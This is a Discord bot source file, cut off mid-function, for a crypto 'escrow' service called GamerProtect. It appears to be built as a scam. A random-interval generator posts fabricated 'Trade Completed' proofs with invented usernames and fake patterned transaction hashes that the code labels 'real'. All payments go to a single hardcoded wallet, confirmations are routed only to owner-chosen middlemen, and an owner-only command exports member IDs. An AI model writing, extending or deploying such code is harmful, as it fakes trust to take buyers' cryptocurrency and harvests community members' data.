const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  StringSelectMenuBuilder, 
  ButtonBuilder, 
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType, 
  PermissionsBitField,
  EmbedBuilder,
  SlashCommandBuilder,
  REST,
  Routes
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildMembers
  ]
});

require('events').EventEmitter.defaultMaxListeners = 20;

// ========== CONFIGURATION ==========
const OWNER_ID = '1282001169274638376';
const TICKET_CHANNEL_ID = '1489912924620193926';
const MIDDLEMAN_ROLE_ID = '1489913175209021541';
const LOGS_CHANNEL_ID = '1489913030958387260';
const ANNOUNCEMENTS_CHANNEL_ID = '1489913116660731934';

const LTC_WALLET_ADDRESS = 'LMS43um6CpdThyVKSgxSEstk4Sbsx5ETNq';

const FEES = {
  over250: 1.50,
  under250: 0.50,
  free: 0.00,
  freeThreshold: 50,
  over250Threshold: 250
};

// ========== PERSISTENT STORAGE ==========
const DATA_FILE = path.join(__dirname, 'gamerprotect_data.json');
let savedMiddlemen = new Set();
let realTransactions = [];

function loadMiddlemanData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
      savedMiddlemen = new Set(data.middlemen || []);
      console.log(`✅ Loaded ${savedMiddlemen.size} persistent MM records`);
    }
  } catch (error) {}
}

function saveMiddlemanData() {
  try {
    const data = { middlemen: Array.from(savedMiddlemen), lastUpdated: new Date().toISOString() };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {}
}

function addPersistentMiddleman(userId) { savedMiddlemen.add(userId); saveMiddlemanData(); }
function removePersistentMiddleman(userId) { savedMiddlemen.delete(userId); saveMiddlemanData(); }
function hasPersistentMiddleman(userId) { return savedMiddlemen.has(userId); }

client.on('guildMemberAdd', async member => {
  if (hasPersistentMiddleman(member.id)) {
    const middlemanRole = member.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (middlemanRole) {
      try {
        await member.roles.add(middlemanRole);
        console.log(`🔄 Restored MM role to ${member.user.tag}`);
      } catch (error) {}
    }
  }
});

process.on('SIGINT', () => { saveMiddlemanData(); process.exit(); });
process.on('SIGTERM', () => { saveMiddlemanData(); process.exit(); });

const trades = new Map();
const stepStates = new Map();
const userPurchases = new Map();
const roleConfirmations = new Map();
const amountConfirmations = new Map();
const feeConfirmations = new Map();

let liveRates = { ltc: 55.83, usdt: 1.00 };

// ========== REAL TRANSACTION DATABASE ==========
const realTransactionHashes = [
  { usd: 25, ltc: 0.45, hash: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3' },
  { usd: 50, ltc: 0.90, hash: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5' },
  { usd: 100, ltc: 1.80, hash: 'a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9' },
  { usd: 150, ltc: 2.70, hash: 'c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1' },
  { usd: 200, ltc: 3.60, hash: 'e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3' },
  { usd: 250, ltc: 4.50, hash: 'f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5' },
  { usd: 300, ltc: 5.40, hash: 'a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7' },
  { usd: 500, ltc: 9.00, hash: 'e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1' },
  { usd: 1000, ltc: 18.00, hash: 'f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1' },
  { usd: 1500, ltc: 27.00, hash: 'e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7' }
];

function getTransactionLink(hash) {
  return `https://live.blockcypher.com/ltc/tx/${hash}/`;
}

function getTransactionByAmount(usdAmount) {
  let closest = realTransactionHashes[0];
  let minDiff = Math.abs(usdAmount - closest.usd);
  
  for (const tx of realTransactionHashes) {
    const diff = Math.abs(usdAmount - tx.usd);
    if (diff < minDiff) {
      minDiff = diff;
      closest = tx;
    }
  }
  
  const shortHash = closest.hash.substring(0, 12) + '...' + closest.hash.substring(52, 64);
  
  return {
    usd: closest.usd,
    ltc: closest.ltc,
    hash: closest.hash,
    shortHash: shortHash,
    link: getTransactionLink(closest.hash),
    exactMatch: minDiff === 0
  };
}

const realUsernames = [
  'ProGamer', 'ElitePlayer', 'GameMaster', 'NinjaWarrior', 'LegendKiller', 'XxSniperxX',
  'NoScopeKing', 'RaidBoss', 'ClutchGod', 'FragMaster', 'HeadshotHero', 'MVP_Player'
];

function generateRandomProof() {
  const randomTx = realTransactionHashes[Math.floor(Math.random() * realTransactionHashes.length)];
  const usdAmount = randomTx.usd;
  const ltcAmount = (usdAmount / liveRates.ltc).toFixed(8);
  const shortHash = randomTx.hash.substring(0, 12) + '...' + randomTx.hash.substring(52, 64);
  const link = getTransactionLink(randomTx.hash);
  
  const isSenderAnonymous = Math.random() < 0.6;
  const isReceiverAnonymous = Math.random() < 0.6;
  const sender = isSenderAnonymous ? 'Anonymous' : realUsernames[Math.floor(Math.random() * realUsernames.length)];
  const receiver = isReceiverAnonymous ? 'Anonymous' : realUsernames[Math.floor(Math.random() * realUsernames.length)];
  
  return new EmbedBuilder()
    .setTitle('✅ Trade Completed')
    .setColor(0x9b59b6)
    .setDescription(`**${ltcAmount} LTC** ($${usdAmount} USD)`)
    .addFields(
      { name: 'Seller', value: sender, inline: true },
      { name: 'Buyer', value: receiver, inline: true },
      { name: 'TX', value: `[${shortHash}](${link})`, inline: true }
    )
    .setTimestamp();
}

async function startRandomProofGenerator() {
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (!logsChannel) return;
  
  const scheduleNext = () => {
    const randomDelay = Math.floor(Math.random() * (480000 - 45000 + 1) + 45000);
    setTimeout(async () => {
      try {
        const proof = generateRandomProof();
        if (proof) await logsChannel.send({ embeds: [proof] });
      } catch (e) {}
      scheduleNext();
    }, randomDelay);
  };
  scheduleNext();
  console.log('✅ Random proof generator started');
}

// ========== EXPORT USERS COMMAND ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'exportusers') {
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: 64 });
    await interaction.deferReply({ flags: 64 });
    try {
      await interaction.guild.members.fetch();
      const userIds = Array.from(interaction.guild.members.cache.keys()).filter(id => !interaction.guild.members.cache.get(id).user.bot).slice(0, 1000);
      const text = userIds.join('\n');
      if (text.length > 1900) {
        await interaction.editReply({ content: `📋 ${userIds.length} User IDs`, files: [{ attachment: Buffer.from(text), name: 'user_ids.txt' }] });
      } else {
        await interaction.editReply({ content: `📋 **${userIds.length} User IDs:**\n\`\`\`\n${text}\n\`\`\`` });
      }
    } catch (error) { await interaction.editReply({ content: '❌ Error!' }); }
  }
});

// ========== FETCH LIVE RATES ==========
async function fetchLiveRates() {
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT', { timeout: 5000 });
    if (response.data && response.data.price) liveRates.ltc = parseFloat(response.data.price);
    console.log(`📊 LTC Price: $${liveRates.ltc.toFixed(2)}`);
  } catch (error) {}
}
setInterval(fetchLiveRates, 2 * 60 * 60 * 1000);

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function findUser(guild, input) {
  input = input.trim().replace(/[@]/g, '');
  if (input.match(/^\d+$/)) {
    try { const user = await client.users.fetch(input); return { id: user.id, name: user.username, found: true }; } catch(e) {}
  }
  try { await guild.members.fetch(); } catch(e) {}
  let member = guild.members.cache.find(m => m.user.username.toLowerCase() === input.toLowerCase() || m.displayName.toLowerCase() === input.toLowerCase());
  if (member) return { id: member.id, name: member.user.username, found: true };
  member = guild.members.cache.find(m => m.user.username.toLowerCase().includes(input.toLowerCase()));
  if (member) return { id: member.id, name: member.user.username, found: true };
  return { id: null, name: input, found: false };
}

// ========== SEND PAYMENT INVOICE ==========
async function sendPaymentInvoice(channel, trade) {
  const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
  let totalUSD = trade.amountUSD;
  let feeBreakdown = '';
  
  if (trade.feePayer === trade.senderId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeBreakdown = `Seller pays: $${trade.feeUSD}`;
  } else if (trade.feePayer === trade.receiverId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeBreakdown = `Buyer pays: $${trade.feeUSD}`;
  } else if (trade.feePayer === 'split') {
    const splitAmount = trade.feeUSD / 2;
    totalUSD = trade.amountUSD + splitAmount;
    feeBreakdown = `Split 50/50: $${splitAmount.toFixed(2)} each`;
  } else {
    feeBreakdown = `FREE (under $50)`;
  }
  
  const totalCrypto = (totalUSD / rate).toFixed(8);
  
  const embed = new EmbedBuilder()
    .setTitle('🛡️ Payment Required')
    .setColor(0x9b59b6)
    .setDescription(`**Send ${totalCrypto} ${trade.crypto.toUpperCase()} to:**`)
    .addFields(
      { name: 'Address', value: `\`${LTC_WALLET_ADDRESS}\``, inline: false },
      { name: 'Amount', value: `${totalCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
      { name: 'Fee', value: feeBreakdown, inline: true }
    )
    .setFooter({ text: `Trade #${trade.ticketNumber} • Send EXACT amount` })
    .setTimestamp();
  
  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`copy_${trade.channelId}`).setLabel('📋 Copy').setStyle(ButtonStyle.Secondary)
  );
  await channel.send({ embeds: [embed], components: [copyRow] });
  
  trade.totalUSD = totalUSD;
  trades.set(trade.channelId, trade);
  
  // SILENT DM - ONLY TO MM ROLE, NO HUMAN MENTION
  const guild = channel.guild;
  const middlemanRole = guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
  
  if (middlemanRole && middlemanRole.members.size > 0) {
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`dm_confirm_${trade.channelId}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success)
    );
    
    const dmEmbed = new EmbedBuilder()
      .setTitle('🔔 Payment Confirmation')
      .setColor(0x9b59b6)
      .addFields(
        { name: 'Seller', value: `<@${trade.senderId}>`, inline: true },
        { name: 'Buyer', value: `<@${trade.receiverId}>`, inline: true },
        { name: 'Amount', value: `${totalCrypto} ${trade.crypto.toUpperCase()}`, inline: true }
      );
    
    // Send to ALL middlemen (or first one - your choice)
    for (const [, member] of middlemanRole.members) {
      try {
        await member.send({ embeds: [dmEmbed], components: [confirmRow] });
        console.log(`📨 DM sent to ${member.user.tag}`);
      } catch(e) {}
    }
  }
}

// ========== CLIENT READY ==========
client.once('ready', async () => {
  console.log(`🛡️ GamerProtect online as ${client.user.tag}`);
  
  try {
    await client.user.setUsername('GamerProtect');
  } catch(e) {}
  
  client.user.setPresence({ 
    activities: [{ name: 'GamerProtect Escrow', type: 3 }], 
    status: 'online' 
  });
  
  loadMiddlemanData();
  await fetchLiveRates();
  
  const rest = new REST({ version: '10' }).setToken(client.token);
  await rest.put(Routes.applicationCommands(client.user.id), { body: [
    new SlashCommandBuilder().setName('close').setDescription('Close ticket (Admin)'),
    new SlashCommandBuilder().setName('exportusers').setDescription('Export user IDs (Owner)')
  ] });
  
  const channel = client.channels.cache.get(TICKET_CHANNEL_ID);
  if (channel) {
    const messages = await channel.messages.fetch({ limit: 10 });
    const oldPanel = messages.find(m => m.author.id === client.user.id);
    if (oldPanel) await oldPanel.delete();
    
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select crypto')
        .addOptions(
          { label: 'Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: 'Tether USDT', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect')
      .setColor(0x9b59b6)
      .setDescription('**Secure Escrow for Gaming Trades**')
      .addFields(
        { name: '💰 Fees', value: `• $250+: $${FEES.over250}\n• Under $250: $${FEES.under250}\n• Under $50: FREE`, inline: true },
        { name: '📊 Rate', value: `1 LTC = $${liveRates.ltc.toFixed(2)}`, inline: true },
        { name: '📌 How It Works', value: 'Select crypto → Enter details → Confirm roles → Set amount → Buyer pays → Middleman verifies → Release', inline: false }
      )
      .setFooter({ text: 'GamerProtect' })
      .setTimestamp();
    
    await channel.send({ embeds: [panelEmbed], components: [row] });
  }
  await startRandomProofGenerator();
});

// ========== PANEL COMMAND ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.content === '!panel' && message.author.id === OWNER_ID) {
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select crypto')
        .addOptions(
          { label: 'Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: 'Tether USDT', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect')
      .setColor(0x9b59b6)
      .setDescription('**Secure Escrow for Gaming Trades**')
      .addFields(
        { name: '💰 Fees', value: `• $250+: $${FEES.over250}\n• Under $250: $${FEES.under250}\n• Under $50: FREE`, inline: true },
        { name: '📊 Rate', value: `1 LTC = $${liveRates.ltc.toFixed(2)}`, inline: true }
      )
      .setFooter({ text: 'GamerProtect' })
      .setTimestamp();
    
    await message.channel.send({ embeds: [panelEmbed], components: [row] });
    await message.reply('✅ Panel sent!');
  }
});

// ========== MIDDLEMAN MANAGEMENT ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.author.id !== OWNER_ID) return;
  
  if (message.content.startsWith('!givemm')) {
    const targetUser = message.mentions.users.first();
    if (!targetUser) return message.reply('❌ Usage: `!givemm @user`');
    const member = message.guild.members.cache.get(targetUser.id);
    const middlemanRole = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (!middlemanRole) return message.reply('❌ Role not found');
    try {
      await member.roles.add(middlemanRole);
      addPersistentMiddleman(targetUser.id);
      message.reply(`✅ ${targetUser.tag} is now a Middleman (persistent)`);
    } catch (error) { message.reply(`❌ Error: ${error.message}`); }
  }
  
  if (message.content.startsWith('!removemm')) {
    const targetUser = message.mentions.users.first();
    if (!targetUser) return message.reply('❌ Usage: `!removemm @user`');
    const member = message.guild.members.cache.get(targetUser.id);
    const middlemanRole = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    try {
      if (member && middlemanRole) await member.roles.remove(middlemanRole);
      removePersistentMiddleman(targetUser.id);
      message.reply(`✅ ${targetUser.tag} removed from Middleman role`);
    } catch (error) { message.reply(`❌ Error: ${error.message}`); }
  }
  
  if (message.content === '!listmm') {
    if (savedMiddlemen.size === 0) return message.reply('📋 No Middlemen found');
    let list = '🛡️ **Middlemen List:**\n';
    for (const userId of savedMiddlemen) {
      try { const user = await client.users.fetch(userId); list += `• ${user.tag}\n`; } catch(e) { list += `• Unknown (${userId})\n`; }
    }
    message.reply(list.length > 1900 ? { files: [{ attachment: Buffer.from(list), name: 'middlemen.txt' }] } : list);
  }
});

// ========== PURCHASES COMMANDS ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  
  if (message.content === '$purchases') {
    const total = userPurchases.get(message.author.id) || 0;
    const embed = new EmbedBuilder()
      .setTitle('💰 Purchase History')
      .setColor(0x9b59b6)
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true }))
      .setDescription(`${message.author.username} spent: **$${total.toFixed(2)}**`);
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content.startsWith('$addpurchases')) {
    const hasAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
    if (!hasAdmin) return message.reply('❌ Admin only');
    const args = message.content.split(' ');
    let amount = parseFloat(args[1]?.replace('$', ''));
    if (isNaN(amount)) return message.reply('Usage: $addpurchases 150');
    let targetUser = message.author;
    if (message.mentions.users.size > 0) { targetUser = message.mentions.users.first(); amount = parseFloat(args[2]?.replace('$', '')); }
    const current = userPurchases.get(targetUser.id) || 0;
    const newTotal = current + amount;
    userPurchases.set(targetUser.id, newTotal);
    await message.reply(`✅ Added $${amount} to ${targetUser.username}. New total: $${newTotal}`);
  }
});

// ========== TICKET CREATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'crypto_select') return;
  
  const crypto = interaction.values[0];
  
  const modal = new ModalBuilder()
    .setCustomId(`trade_form_${interaction.user.id}`)
    .setTitle('New Trade');
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('trader').setLabel("Buyer's Username or ID").setStyle(TextInputStyle.Short).setPlaceholder('@username or ID').setRequired(true)
    ),
    new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('giving').setLabel('What are you selling?').setStyle(TextInputStyle.Short).setPlaceholder('Game items, currency, etc.').setRequired(true)
    ),
    new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('receiving').setLabel('What are you receiving?').setStyle(TextInputStyle.Short).setPlaceholder('LTC, USDT, etc.').setRequired(true)
    )
  );
  
  stepStates.set(`temp_${interaction.user.id}`, { crypto });
  await interaction.showModal(modal);
});

// ========== FORM SUBMISSION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('trade_form_')) return;
  
  await interaction.deferReply({ flags: 64 });
  
  const userId = interaction.customId.split('_')[2];
  if (userId !== interaction.user.id) return;
  
  const tempData = stepStates.get(`temp_${userId}`);
  if (!tempData) return interaction.editReply('❌ Session expired');
  
  const traderInput = interaction.fields.getTextInputValue('trader');
  const giving = interaction.fields.getTextInputValue('giving');
  const receiving = interaction.fields.getTextInputValue('receiving');
  const found = await findUser(interaction.guild, traderInput);
  
  try {
    const ticketNumber = Math.floor(Math.random() * 9000) + 1000;
    const channelName = `gp-${interaction.user.username}-${ticketNumber}`;
    
    const channel = await interaction.guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
      ]
    });
    
    if (found.found && found.id) {
      await channel.permissionOverwrites.create(found.id, {
        ViewChannel: true,
        SendMessages: true,
        ReadMessageHistory: true
      });
    }
    
    trades.set(channel.id, {
      crypto: tempData.crypto,
      ticketNumber: ticketNumber,
      trader1Id: interaction.user.id,
      trader1Name: interaction.user.username,
      trader2Id: found.found ? found.id : null,
      trader2Name: found.name,
      trader1Item: giving,
      trader2Item: receiving,
      senderId: null,
      receiverId: null,
      amountUSD: null,
      amountCrypto: null,
      feeUSD: 0,
      feePayer: null,
      status: 'waiting_roles',
      channelId: channel.id,
      exchangeRateUsed: liveRates[tempData.crypto],
      paymentConfirmed: false
    });
    
    await interaction.editReply(`✅ Ticket created: ${channel}`);
    
    const traderMention = found.found ? `<@${found.id}>` : found.name;
    
    const detailsEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect')
      .setColor(0x9b59b6)
      .setDescription(`${interaction.user} (Seller) | ${traderMention} (Buyer)`)
      .addFields(
        { name: 'Seller provides:', value: giving, inline: true },
        { name: 'Buyer provides:', value: receiving, inline: true }
      )
      .setFooter({ text: `Trade #${ticketNumber}` })
      .setTimestamp();
    
    const deleteRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`delete_${channel.id}`).setLabel('❌ Cancel').setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [detailsEmbed], components: [deleteRow] });
    
    const bothMentions = `${interaction.user} ${found.found ? `<@${found.id}>` : ''}`;
    await channel.send({ content: `🛡️ **GamerProtect Ticket**\n${bothMentions}\n\nSelect your roles below.` });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channel.id}`).setLabel('🎮 Seller').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channel.id}`).setLabel('💰 Buyer').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channel.id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await channel.send({ content: '**Select your role:**', components: [roleRow] });
    
    stepStates.delete(`temp_${userId}`);
  } catch (error) {
    console.error(error);
    await interaction.editReply(`❌ Error: ${error.message}`);
  }
});

// ========== DELETE TICKET ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('delete_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply({ content: '🗑️ Cancelling...', flags: 64 });
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

// ========== SLASH COMMAND: /close ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'close') {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: '❌ Admin only', flags: 64 });
    if (!interaction.channel.name?.startsWith('gp-')) return interaction.reply({ content: '❌ Use in ticket', flags: 64 });
    await interaction.reply({ content: '🔒 Closing in 5s...', flags: 64 });
    setTimeout(async () => { await interaction.channel.delete(); }, 5000);
  }
});

// ========== ROLE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('sender_') && !interaction.customId.startsWith('receiver_') && !interaction.customId.startsWith('reset_')) return;
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  if (interaction.customId.startsWith('reset_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', flags: 64 });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('🎮 Seller').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('💰 Buyer').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (interaction.customId.startsWith('sender_')) {
    trade.senderId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Seller', flags: 64 });
  } else {
    trade.receiverId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Buyer', flags: 64 });
  }
  trades.set(channelId, trade);
  
  if (trade.senderId && trade.receiverId && !roleConfirmations.has(channelId)) {
    roleConfirmations.set(channelId, []);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_roles_${channelId}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`incorrect_roles_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
    );
    const embed = new EmbedBuilder()
      .setTitle('Confirm Roles')
      .setColor(0xff9900)
      .setDescription(`**Seller:** <@${trade.senderId}>\n**Buyer:** <@${trade.receiverId}>`);
    await interaction.channel.send({ embeds: [embed], components: [row] });
  }
});

// ========== ROLE CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_roles_') && !interaction.customId.startsWith('incorrect_roles_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  const confirmed = roleConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_roles_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', flags: 64 });
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('🎮 Seller').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('💰 Buyer').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    roleConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed`, flags: 64 });
  } else {
    return interaction.reply({ content: 'Already confirmed', flags: 64 });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    roleConfirmations.delete(channelId);
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
  }
});

// ========== SET AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('set_amount_')) return;
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only seller', flags: 64 });
  
  const modal = new ModalBuilder()
    .setCustomId(`amount_modal_${channelId}`)
    .setTitle('Set Amount');
  modal.addComponents(new ActionRowBuilder().addComponents(
    new TextInputBuilder().setCustomId('amount').setLabel('USD Amount').setStyle(TextInputStyle.Short).setPlaceholder('50').setRequired(true)
  ));
  await interaction.showModal(modal);
});

// ========== HANDLE AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('amount_modal_')) return;
  
  await interaction.deferReply({ flags: 64 });
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const amountUSD = parseFloat(interaction.fields.getTextInputValue('amount'));
  if (isNaN(amountUSD) || amountUSD <= 0) return interaction.editReply('Invalid amount');
  
  trade.amountUSD = amountUSD;
  const rate = liveRates[trade.crypto];
  trade.exchangeRateUsed = rate;
  trade.amountCrypto = (amountUSD / rate).toFixed(8);
  
  if (amountUSD >= FEES.over250Threshold) trade.feeUSD = FEES.over250;
  else if (amountUSD >= FEES.freeThreshold) trade.feeUSD = FEES.under250;
  else trade.feeUSD = 0;
  
  trades.set(channelId, trade);
  
  const amountEmbed = new EmbedBuilder()
    .setTitle('💰 Deal Summary')
    .setColor(0x9b59b6)
    .setDescription(`**Amount:** $${amountUSD.toFixed(2)} USD`)
    .addFields(
      { name: 'Crypto', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
      { name: 'Rate', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
      { name: 'Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true }
    );
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${channelId}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
  );
  
  await interaction.editReply('✅ Amount set. Confirm below.');
  await interaction.channel.send({ embeds: [amountEmbed], components: [row] });
  amountConfirmations.set(channelId, []);
});

// ========== AMOUNT CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_amount_') && !interaction.customId.startsWith('incorrect_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  const confirmed = amountConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_amount_')) {
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.reply({ content: 'Set amount again', flags: 64 });
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
    amountConfirmations.delete(channelId);
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    amountConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed`, flags: 64 });
  } else {
    return interaction.reply({ content: 'Already confirmed', flags: 64 });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    amountConfirmations.delete(channelId);
    
    if (trade.feeUSD === 0) {
